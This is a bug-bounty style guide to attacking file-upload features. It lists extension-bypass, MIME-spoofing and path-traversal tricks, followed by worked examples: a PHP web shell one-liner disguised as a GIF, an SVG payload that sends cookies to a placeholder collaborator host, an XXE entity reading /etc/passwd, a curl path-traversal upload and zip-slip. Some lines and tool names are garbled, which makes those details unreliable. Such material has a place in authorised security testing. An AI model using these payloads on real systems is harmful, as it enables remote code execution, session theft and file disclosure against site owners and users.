# HOW TO TEST FILE UPLOAD ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N ways to test
1. Extension bypass: .php  .php5 .phtml  .phar  .asp  .aspx  .jsp(.jspx) .sh .py .cgi;  case: .PhP;  dots: .php.  ;  spaces: "file.php ".  double ext: .php.jpg.  null: .php%00.jpg.
2. MIME/magic: upload with Content-Type text/html while body is a PHP shell; match magic bytes by prepending GIF89a; craft polyglot files.
3. Content sniffing: file  upload that ends up served as HTML (svg, xhtml, html, svgz?) - stored XSS with cookies.
4. SVG upload: XSS + XXE (image/xml parse).
5. Tika/Zero.py path traversal rename: filename=../../../../var/www/html/shell.php.
6. RCE via parsers: .phar deserialization, zip archive zip-slip, XML with external entities, image libs with CVEs.
7. Filename -> header injection (CRLF in name), stored XSS when filename echoed.
8. Access-control on the file: uploaded files fetchable by others (IDOR on /uploads/uuid).
9. Double extension backend: .php.jpg passed by check for .jpg then executed by .php worker.
10. Whitelist UT+oc: check what the SERVER executes (extension) not what UI displays.

## Step-by-step on target
1. Login, locate upload (avatar, document, import, cover, profile pic "file").
2. Try benign -> observe: storage path, URL pattern (/uploads/<id>), content-type served.
3. Extension ladder: php7 .phtml.jpg etc. Watch for 200 + execution attempt in response (execute: phpinfo via image).
4. Then confirm EXEC search: request a created file (e.g. shell.php) and check content type + response code.
5. If no direct exec, test polyglot/html+svg for stored XSS and XML-based XXE.
6. IDOR the file (src param) - permalinks often guessable.
7. Look at response header / uploading again to see filename rewritten (sanitizer that encodes dots=broken, missing = exploitable).

## Bypass ladder (server-side is final judge)
Extension case -> %00 -> double ext -> trailing dot/space -> double extension depends on Apache handlers:
   php.cgi, php5.shtml in some configs; htaccess enable overrides.
The undeniable test: does requesting the file EXECUTE it (phpinfo in body, 200 vs 500).

## False positives
- Upload succeeds but file stored as .txt and served as text = no RCE, still stored-content risk.
- Polyglot that never runs = no XSS.
- Filename sanitized properly (random name) = no traversal.

## Tools
- Burp upload fuzzer, magicbytes cheatsheet, muff-dataris, ExifTool, Vincent (upload parser).

## WORKED EXAMPLES (concrete)
A. Extension ladder (avatar upload):
file="shell.php"            ->  "Invalid type" (blocked)
file="shell.phtml"          ->  try
file="shell.php5"           ->  try
file="shell.php%00.png"     ->  null-byte (older PHP/Apache)
file="shell.php."           ->  trailing dot (Windows Apache parse)
file="shell.php "           ->  trailing space
file="shell.pHp"            ->  case
file="shell.php.jpg"        ->  double extension
file="shell.php.jpg.png"    ->  allow-pass chain
B. Magic-byte polyglot (cat gif header + php code):
echo -n "GIF89a<?php system(\$_GET['c']); ?>" > shell.php
change Content-Type of the POST part to image/gif
C. SVG stored XSS:
upload:  data:image/svg+xml,<svg onload="fetch('//YOUR-COLLABORATOR/?c='+document.cookie)">
then access the uploaded /uploads/x.svg (server serves text/html-ish mime)
D. XXE in SVG/office doc:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="file:///etc/passwd"/>
</svg>
E. Path traversal rename:
curl -F "file=@shell.php;filename=../../../../var/www/html/shell.php" \
-F "mime=image/png" http://target.com/upload
F. Zip-slip (extract zip server-side):
craft zip with entry name "../../evil.php"

## EXECUTION CONFIRM
The REAL test is whether requesting the file runs code, not just storage:
```
curl -i "https://target.com/uploads/shell.php" | grep -i "x-powered-by\|200"   # 200 + php = RCE
IDOR the uploaded file via /uploads/<guessable-id>:
curl -i "https://target.com/files/12345"
```
